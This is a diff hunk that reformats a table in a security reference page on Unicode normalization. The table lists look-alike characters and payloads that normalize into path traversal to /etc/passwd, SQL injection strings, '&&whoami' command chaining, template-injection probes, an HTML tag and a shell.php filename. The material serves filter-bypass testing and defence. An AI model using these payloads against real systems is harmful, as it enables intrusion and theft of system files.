@@ -26,22 +26,22 @@ Unicode normalization is the process of converting Unicode text into a standardi
 * **NFKC** (Normalization Form Compatibility Composition): Like NFC, but also replaces characters with compatibility equivalents (may change appearance/format).
 * **NFKD** (Normalization Form Compatibility Decomposition): Like NFD, but also decomposes compatibility characters.
 
-| Character    | Payload               | After Normalization   |
-| ------------ | --------------------- | --------------------- |
-| `‥` (U+2025) | `‥/‥/‥/etc/passwd` | `../../../etc/passwd` |
+| Character     | Payload               | After Normalization   |
+| ------------- | --------------------- | --------------------- |
+| `‥` (U+2025)  | `‥/‥/‥/etc/passwd`    | `../../../etc/passwd` |
 | `︰` (U+FE30) | `︰/︰/︰/etc/passwd` | `../../../etc/passwd` |
-| `＇` (U+FF07) | `＇ or ＇1＇=＇1` | `' or '1'='1` |
-| `＂` (U+FF02) | `＂ or ＂1＂=＂1` | `" or "1"="1` |
-| `﹣` (U+FE63) | `admin'﹣﹣` | `admin'--` |
-| `。` (U+3002) | `domain。com` | `domain.com` |
-| `／` (U+FF0F) | `／／domain.com` | `//domain.com` |
-| `＜` (U+FF1C) | `＜img src=a＞` | `<img src=a/>` |
-| `﹛` (U+FE5B) | `﹛﹛3+3﹜﹜` | `{{3+3}}` |
-| `［` (U+FF3B) | `［［5+5］］` | `[[5+5]]` |
-| `＆` (U+FF06) | `＆＆whoami` | `&&whoami` |
-| `ｐ` (U+FF50) | `shell.ｐʰｐ` | `shell.php` |
-| `ʰ` (U+02B0) | `shell.ｐʰｐ` | `shell.php` |
-| `ª` (U+00AA) | `ªdmin` | `admin` |
+| `＇` (U+FF07) | `＇ or ＇1＇=＇1`     | `' or '1'='1`         |
+| `＂` (U+FF02) | `＂ or ＂1＂=＂1`     | `" or "1"="1`         |
+| `﹣` (U+FE63) | `admin'﹣﹣`          | `admin'--`            |
+| `。` (U+3002) | `domain。com`         | `domain.com`          |
+| `／` (U+FF0F) | `／／domain.com`      | `//domain.com`        |
+| `＜` (U+FF1C) | `＜img src=a＞`       | `<img src=a/>`        |
+| `﹛` (U+FE5B) | `﹛﹛3+3﹜﹜`         | `{{3+3}}`             |
+| `［` (U+FF3B) | `［［5+5］］`         | `[[5+5]]`             |
+| `＆` (U+FF06) | `＆＆whoami`          | `&&whoami`            |
+| `ｐ` (U+FF50) | `shell.ｐʰｐ`         | `shell.php`           |
+| `ʰ` (U+02B0)  | `shell.ｐʰｐ`         | `shell.php`           |
+| `ª` (U+00AA)  | `ªdmin`               | `admin`               |
 
 ```py
 import unicodedata
